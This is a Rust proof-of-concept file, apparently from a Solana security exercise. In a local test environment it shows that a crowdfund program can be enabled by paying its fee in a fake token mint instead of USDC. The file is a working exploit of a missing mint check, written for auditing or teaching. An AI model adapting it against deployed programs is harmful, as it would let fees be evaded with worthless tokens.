use solana_program::{
    native_token::sol_to_lamports,
    pubkey::{Pubkey, PubkeyError},
    system_program,
};

use std::env;

use crowdfund::{instruction::ix_pay_enable_fee, state::CampaignAccount};

use poc_framework::{
    borsh::BorshSerialize, keypair, solana_sdk::signer::Signer,
    spl_associated_token_account::get_associated_token_address, Environment, LocalEnvironment,
    PrintableTransaction,
};

use pocs::assert_tx_success;

pub fn main() {
    let fee_amount = 50000000;

    let mut dir = env::current_exe().unwrap();
    let path = {
        dir.pop();
        dir.pop();
        dir.push("deploy");
        dir.push("crowdfund.so");
        dir.to_str()
    }
    .unwrap();

    let fund_program_id = keypair(88).pubkey();

    // writable 'fund account'. Here the state will be stored
    let fund_account = keypair(0);

    // Program Derived Address. Derived from 'fund program ID' and 'fund account'
    let fund_authority = authority_id(&fund_program_id, &fund_account.pubkey(), 99).unwrap();

    // who creates the fund
    let creator = keypair(10);

    // Token PID
    let token_program_id = spl_token::id();

    // Fake token mint to slip instead of USDC :)
    let fake_token = keypair(20);

    // ATA Account to collect and store fake USDC token's fees. Account is owned by 'PDA'
    let fee_vault = get_associated_token_address(&fund_authority, &fake_token.pubkey());

    // (a) Create Fund data
    let fund_data = CampaignAccount {
        enabled: 0,
        nonce: 99,
        goal_amount: 100_000_000_000,
        creator: creator.pubkey(),
        fee_vault,
    };

    // (b) Serialize this data in order to populate fund account with it
    let mut writer_data: Vec<u8> = vec![];
    fund_data.serialize(&mut writer_data).unwrap();

    // Build the initial environment
    let mut env = LocalEnvironment::builder()
        // 1. deploy the Fund Program
        .add_program(fund_program_id, path)
        // 2. register 'creator account'
        .add_account_with_lamports(creator.pubkey(), system_program::ID, sol_to_lamports(10.0))
        // 3. register fund account and populate it with the above data
        .add_account_with_data(
            fund_account.pubkey(),
            fund_program_id,
            writer_data.as_mut(),
            false,
        )
        // 4. register ATA with the fake USDC token's mint owned by 'creator account'
        .add_associated_account_with_tokens(creator.pubkey(), fake_token.pubkey(), fee_amount)
        // 5. register ATA with the fake USDC token's mint owned by 'PDA'
        .add_associated_account_with_tokens(fund_authority, fake_token.pubkey(), fee_amount)
        .build();

    // After the build phase, derive the address of ATA for fake USDC owned by 'creator account'
    let creator_token_account =
        get_associated_token_address(&creator.pubkey(), &fake_token.pubkey());

    // Enable the Fund
    let tx_create = env.execute_as_transaction(
        &[ix_pay_enable_fee(
            &fund_account.pubkey(),
            &fund_authority,
            &creator.pubkey(),
            &creator_token_account,
            &fee_vault,
            &token_program_id,
            &fund_program_id,
            fee_amount,
        )],
        &[&creator],
    );

    // Print out the whole transaction on success
    assert_tx_success(tx_create).print();
    println!("[*] Observe, that the fund is enabled using an arbitrary token mint");
}

// Helper function
pub fn authority_id(
    program_id: &Pubkey,
    account_info: &Pubkey,
    nonce: u8,
) -> Result<Pubkey, PubkeyError> {
    Pubkey::create_program_address(&[&account_info.to_bytes()[..32], &[nonce]], program_id)
}
